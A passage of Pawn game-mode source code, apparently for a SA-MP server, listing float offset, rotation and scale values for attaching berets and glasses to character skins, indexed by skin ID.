	{ 0.163098, 0.012013, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 162 || Beret1 -
	{ 0.141079, 0.012013, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 163 || Beret1 -
	{ 0.141079, 0.012013, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 164 || Beret1 -
	{ 0.141079, 0.012013, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 165 || Beret1 -
	{ 0.141079, 0.012013, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 166 || Beret1 -
	{ 0.0, 0.012013, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 167 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.012013, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 168 || Beret1 - NOOOOOOOOO
	{ 0.141079, 0.012013, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 169 || Beret1 -
	{ 0.156033, 0.012013, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 170 || Beret1 -
	{ 0.178052, -0.000019, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 171 || Beret1 -
	{ 0.172130, -0.000019, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 172 || Beret1 -
	{ 0.0, -0.000019, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 173 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.000019, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 174 || Beret1 - NOOOOOOOOO
	{ 0.172130, -0.000019, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 175 || Beret1 - NOOOOOOOOO
	{ 0.172130, -0.000019, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 176 || Beret1 -
	{ 0.172130, -0.000019, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 177 || Beret1 -
	{ 0.172130, -0.000019, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 178 || Beret1 -
	{ 0.172130, -0.000019, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 179 || Beret1 -
	{ 0.172130, -0.000019, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 180 || Beret1 -
	{ 0.0, -0.000019, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 181 || Beret1 - NOOOOOOOOO
	{ 0.150111, -0.000019, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 182 || Beret1 -
	{ 0.150111, -0.000019, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 183 || Beret1 -
	{ 0.150111, 0.011443, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 184 || Beret1 -
	{ 0.168541, 0.001727, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 185 || Beret1 -
	{ 0.168541, 0.001727, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 186 || Beret1 -
	{ 0.158668, -0.009162, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 187 || Beret1 -
	{ 0.158668, -0.009162, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 188 || Beret1 -
	{ 0.158668, -0.009162, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 189 || Beret1 -
	{ 0.179479, -0.009162, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 190 || Beret1 -
	{ 0.179479, -0.009162, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 191 || Beret1 -
	{ 0.179479, -0.009162, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 192 || Beret1 -
	{ 0.179479, -0.009162, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 193 || Beret1 -
	{ 0.179479, -0.009162, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 194 || Beret1 -
	{ 0.0, -0.009162, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 195 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.009162, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 196 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.009162, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 197 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.009162, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 198 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.009162, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 199 || Beret1 - NOOOOOOOOO
	{ 0.163382, 0.006934, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 200 || Beret1 -
	{ 0.0, 0.006934, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 201 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.006934, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 202 || Beret1 - NOOOOOOOOO
	{ 0.163382, 0.006934, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 203 || Beret1 -
	{ 0.163382, 0.006934, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 204 || Beret1 -
	{ 0.0, 0.006934, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 205 || Beret1 - NOOOOOOOOO
	{ 0.163382, 0.006934, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 206 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 207 || Beret1 - NOOOOOOOOO
	{ 0.176095, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 208 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.006934, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 209 || Beret1 - NOOOOOOOOO
	{ 0.138910, 0.006934, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 210 || Beret1 -
	{ 0.163572, 0.004481, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 211 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 212 || Beret1 - NOOOOOOOOO
	{ 0.159425, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 213 || Beret1 -
	{ 0.159425, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 214 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 215 || Beret1 - NOOOOOOOOO
	{ 0.159425, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 216 || Beret1 -
	{ 0.159425, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 217 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 218 || Beret1 - NOOOOOOOOO
	{ 0.159425, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 219 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 220 || Beret1 - NOOOOOOOOO
	{ 0.159425, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 221 || Beret1 -
	{ 0.159425, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 222 || Beret1 -
	{ 0.159425, 0.018406, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 223 || Beret1 -
	{ 0.159425, -0.001424, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 224 || Beret1 -
	{ 0.159425, -0.001424, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 225 || Beret1 -
	{ 0.159425, -0.001424, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 226 || Beret1 -
	{ 0.175773, 0.014291, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 227 || Beret1 -
	{ 0.157342, 0.014291, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 228 || Beret1 -
	{ 0.131626, -0.006592, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 229 || Beret1 -
	{ 0.0, -0.006592, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 230 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.006592, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 231 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.006592, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 232 || Beret1 - NOOOOOOOOO
	{ 0.131626, -0.006592, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 233 || Beret1 -
	{ 0.131626, -0.006592, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 234 || Beret1 -
	{ 0.102910, -0.006592, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 235 || Beret1 -
	{ 0.134742, -0.006592, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 236 || Beret1 -
	{ 0.0, -0.006592, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 237 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.006592, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 238 || Beret1 - NOOOOOOOOO
	{ 0.134742, -0.006592, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 239 || Beret1 -
	{ 0.171015, -0.005360, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 240 || Beret1 -
	{ 0.0, -0.005360, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 241 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.005360, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 242 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.005360, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 243 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.005360, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 244 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.005360, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 245 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.005360, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 246 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.005360, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 247 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.005360, 0.000000, 0.000000, 0.000000, 0.000000, 1.281611, 1.000000, 1.462028 }, // SKINID 248 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.005360, 0.000000, 0.000000, 0.000000, 0.000000, 1.281611, 1.000000, 1.462028 }, // SKINID 249 || Beret1 - NOOOOOOOOO
	{ 0.161642, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 250 || Beret1 -
	{ 0.161642, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 251 || Beret1 -
	{ 0.161642, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 252 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 253 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 254 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 255 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 256 || Beret1 - NOOOOOOOOO
	{ 0.161642, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 257 || Beret1 -
	{ 0.161642, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 258 || Beret1 -
	{ 0.161642, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 259 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 260 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 261 || Beret1 - NOOOOOOOOO
	{ 0.147644, 0.022091, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 262 || Beret1 -
	{ 0.0, 0.022091, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 263 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.022091, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 264 || Beret1 - NOOOOOOOOO
	{ 0.147644, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 265 || Beret1 -
	{ 0.147644, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 266 || Beret1 -
	{ 0.147644, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 267 || Beret1 -
	{ 0.147644, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 268 || Beret1 -
	{ 0.0, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 269 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 270 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 271 || Beret1 - NOOOOOOOOO
	{ 0.147644, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 272 || Beret1 -
	{ 0.0, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 273 || Beret1 - NOOOOOOOOO
	{ 0.147644, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 274 || Beret1 -
	{ 0.147644, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 275 || Beret1 -
	{ 0.147644, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 276 || Beret1 -
	{ 0.0, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 277 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 278 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 279 || Beret1 - NOOOOOOOOO
	{ 0.147644, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 280 || Beret1 -
	{ 0.147644, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 281 || Beret1 -
	{ 0.147644, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 282 || Beret1 -
	{ 0.0, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 283 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 284 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 285 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 286 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 287 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 288 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 289 || Beret1 - NOOOOOOOOO
	{ 0.147644, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 290 || Beret1 -
	{ 0.170883, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 291 || Beret1 -
	{ 0.133509, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 292 || Beret1 -
	{ 0.0, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 293 || Beret1 - NOOOOOOOOO
	{ 0.155528, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 294 || Beret1 -
	{ 0.155528, 0.003661, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 295 || Beret1 -
	{ 0.155528, 0.004869, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 296 || Beret1 -
	{ 0.155528, 0.004869, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 297 || Beret1 -
	{ 0.155528, 0.004869, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 298 || Beret1 -
	{ 0.155528, 0.024484, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 } // SKINID 299 || Beret1 -
};
new Float:POS_Accesorio_Lentes[300][7] = {
	{0.098771, 0.030772, -0.000335, 85.342658, 84.122947, 4.236968, 1.000000}, // - 0
	{0.100766, 0.028630, -0.003521, 87.936676, 82.110870, 4.236968, 1.000000}, // - 1
	{0.083712, 0.033132, -0.003521, 87.936676, 82.110870, 4.236968, 1.000000}, // - 2
	{0.099500, 0.047703, 0.000558, 280.687683, 90.938697, 169.126358, 1.000000}, // - 3
	{0.126660, 0.017465, -0.004450, 281.516479, 103.193008, 168.312896, 1.167009}, // - 4
	{0.109650, 0.017465, -0.004712, 281.516479, 106.686439, 168.312896, 1.167009}, // - 5
	{0.101269, 0.028933, 0.000001, 281.516479, 91.839576, 168.312896, 1.000000}, // - 6
	{0.090066, 0.043458, -0.006523, 87.936676, 82.110870, 4.236968, 1.000000}, // - 7
	{0.087873, 0.038192, -0.003603, 281.516479, 91.839576, 168.312896, 1.020467}, // - 8
	{0.070977, 0.028663, 0.000147, 81.164970, 92.128402, 4.236968, 1.000000},  // - 9
	{0.072317, 0.032179, -0.002934, 86.843269, 84.196006, 4.236968, 1.000000}, // - 10
	{0.072317, 0.035465, -0.002201, 86.843269, 84.196006, 4.236968, 1.000000}, // - 11
	{0.072317, 0.028100, -0.002201, 86.843269, 84.196006, 4.236968, 1.000000}, // - 12
	{0.076569, 0.028100, -0.002201, 86.843269, 84.196006, 4.236968, 1.000000}, // - 13
	{0.091310, 0.049169, -0.002201, 86.843269, 84.196006, 4.236968, 1.000000}, // - 14
	{0.073734, 0.006292, -0.002755, 86.843269, 84.196006, 4.236968, 1.000000}, // - 15
	{0.092845, 0.040331, 0.000183, 86.843269, 82.864280, 4.236968, 1.000000},  // - 16
	{0.088241, 0.030184, -0.000157, 86.843269, 82.864280, 4.236968, 1.000000}, // - 17
	{0.061677, 0.029596, -0.007398, 86.843269, 82.864280, 4.236968, 1.000000}, // - 18
	{0.079911, 0.029596, -0.002934, 86.843269, 82.864280, 4.236968, 1.000000}, // - 19
	{0.095079, 0.029596, -0.001718, 85.261871, 86.296562, 4.236968, 1.000000}, // - 20
	{0.093728, 0.042083, -0.005781, 85.261871, 81.636192, 4.236968, 1.000000}, // - 21
	{0.079585, 0.042083, -0.005781, 85.261871, 81.636192, 4.236968, 1.000000}, // - 22
	{0.090786, 0.041737, -0.005263, 85.261871, 81.636192, 4.236968, 1.000000}, // - 23
	{0.085247, 0.026941, -0.000317, 85.261871, 81.636192, 4.236968, 1.000000}, // - 24
	{0.081646, 0.031448, -0.001113, 89.393653, 81.665985, 4.236968, 1.000000}, // - 25
	{0.083700, 0.033814, -0.001960, 86.436462, 81.665985, 4.236968, 1.000000}, // - 26
	{0.092498, 0.037321, -0.001960, 86.436462, 85.568023, 4.236968, 1.000000}, // - 27
	{0.097068, 0.041360, -0.007881, 86.771400, 85.568023, 4.236968, 1.000000}, // - 28
	{0.083456, 0.050595, 0.001011, 86.771400, 77.201461, 4.236968, 1.000000},  // - 29
	{0.076983, 0.047168, -0.006161, 86.771400, 74.329719, 4.236968, 1.000000}, // - 30
	{0.083798, 0.042184, -0.001869, 86.771400, 83.181861, 4.236968, 1.000000}, // - 31
	{0.053021, -0.000587, -0.001869, 86.771400, 66.859710, 4.236968, 1.000000},// - 32
	{0.034386, 0.013324, -0.001869, 86.771400, 80.314460, 4.236968, 1.000000}, // - 33
	{0.104669, 0.037365, -0.001403, 86.771400, 87.178382, 4.236968, 1.000000}, // - 34
	{0.102659, 0.037465, -0.000829, 86.771400, 93.020492, 4.236968, 1.000000}, // - 35
	{0.107638, 0.037465, -0.000829, 86.771400, 93.020492, 4.236968, 1.000000}, // - 36
	{0.107638, 0.035879, -0.000829, 86.771400, 93.020492, 4.236968, 1.000000}, // - 37
	{0.107638, 0.041106, -0.000829, 86.771400, 93.020492, 4.236968, 1.000000}, // - 38
	{0.080326, 0.035634, -0.000829, 86.771400, 93.020492, 4.236968, 1.000000}, // - 39
	{0.080326, 0.027371, -0.000829, 86.771400, 93.020492, 4.236968, 1.000000}, // - 40
	{0.084617, 0.039613, -0.001620, 86.771400, 93.020492, 4.236968, 1.000000}, // - 41
	{0.087873, 0.037386, -0.003603, 281.516479, 91.839576, 168.312896, 1.093392}, // - 42
	{0.040075, 0.025445, -0.000974, 86.771400, 92.964149, 4.236968, 1.000000}, // - 43
	{0.077369, 0.028469, -0.000974, 86.771400, 78.435791, 4.236968, 1.000000}, // - 44
	{0.064145, 0.028684, -0.000974, 86.771400, 84.762802, 4.236968, 1.000000}, // - 45
	{0.091993, 0.056559, -0.000974, 86.771400, 84.762802, 4.236968, 1.000000}, // - 46
	{0.084582, 0.051277, -0.005034, 86.771400, 84.762802, 4.236968, 1.000000}, // - 47
	{0.092182, 0.042095, -0.003533, 86.771400, 84.762802, 4.236968, 1.000000}, // - 48
	{0.086866, 0.032203, -0.001021, 86.771400, 84.762802, 4.236968, 1.000000}, // - 49
	{0.099350, 0.009422, -0.005899, 86.771400, 84.762802, 4.236968, 1.000000}, // - 50
	{0.099350, 0.030598, -0.005899, 86.771400, 84.762802, 4.236968, 1.000000}, // - 51
	{0.099350, 0.030598, -0.003575, 86.771400, 84.762802, 4.236968, 1.000000}, // - 52
	{0.0, 0.0, 0.0, 0.0, 0.0, 0.0}, // - 53
	{0.079123, 0.030598, -0.003575, 86.771400, 84.762802, 4.236968, 1.000000}, // - 54
	{0.063159, 0.029641, -0.003575, 86.771400, 84.762802, 4.236968, 1.000000}, // - 55
	{0.070293, 0.029641, -0.000570, 86.771400, 84.762802, 4.236968, 1.000000}, // - 56
	{0.111305, 0.045368, -0.000570, 86.771400, 84.458084, 4.236968, 1.000000}, // - 57
	{0.084901, 0.020965, -0.000570, 86.771400, 79.542411, 4.236968, 1.000000}, // - 58
	{0.0, 0.0, 0.0, 0.0, 0.0, 0.0}, // - 59
	{0.090164, 0.044163, -0.004754, 86.771400, 79.542411, 4.236968, 1.000000}, // - 60
	{0.087151, 0.041447, -0.000885, 90.928329, 89.598678, 0.000000, 1.000000}, // - 61
	{0.094350, 0.041447, 0.005717, 90.928329, 89.598678, 0.000000, 1.000000},  // - 62
	{0.075534, 0.041447, -0.001751, 90.928329, 89.598678, 0.000000, 1.000000}, // - 63
	{0.075534, 0.041447, -0.001751, 90.928329, 89.598678, 0.000000, 1.000000}, // - 64
	{0.087873, 0.032505, -0.003603, 281.516479, 91.839576, 168.312896, 0.965358}, // - 65
	{0.104148, 0.034787, 0.001341, 90.928329, 89.598678, 0.000000, 1.000000},  // - 66
	{0.104148, 0.034787, 0.001341, 90.928329, 89.598678, 0.000000, 1.000000},  // - 67
	{0.087317, 0.039646, -0.004032, 90.928329, 89.598678, 0.000000, 1.000000}, // - 68
	{0.074873, 0.039646, -0.003072, 90.928329, 89.598678, 0.000000, 1.000000}, // - 69
	{0.090391, 0.042364, 0.005494, 90.928329, 89.598678, 0.000000, 1.000000},  // - 70
	{0.090391, 0.022298, -0.001170, 90.928329, 89.598678, 0.000000, 1.000000}, // - 71
	{0.090391, 0.039580, -0.001170, 90.928329, 89.598678, 0.000000, 1.000000}, // - 72
	{0.090391, 0.038224, -0.001170, 90.928329, 89.598678, 0.000000, 1.000000}, // - 73
	{0.0, 0.0, 0.0, 0.0, 0.0, 0.0}, // - 74
	{0.083113, 0.038224, -0.001170, 90.928329, 89.598678, 0.000000, 1.000000}, // - 75
	{0.072957, 0.028956, -0.001170, 90.928329, 89.598678, 0.000000, 1.000000}, // - 76
	{0.069398, 0.039981, -0.001170, 90.928329, 89.598678, 0.000000, 1.000000}, // - 77
	{0.105738, 0.010001, 0.004508, 90.928329, 79.030494, 0.000000, 1.000000},  // - 78
	{0.078264, 0.019668, 0.004508, 90.928329, 79.030494, 0.000000, 1.000000},  // - 79
	{0.087377, 0.022096, -0.001993, 90.928329, 79.030494, 0.000000, 1.000000}, // - 80
	{0.087377, 0.022096, -0.001635, 90.928329, 79.030494, 0.000000, 1.000000}, // - 81
	{0.100623, 0.043063, -0.001635, 90.928329, 87.672645, 0.000000, 1.000000}, // - 82
	{0.092528, 0.027493, -0.001635, 90.928329, 87.672645, 0.000000, 1.000000}, // - 83
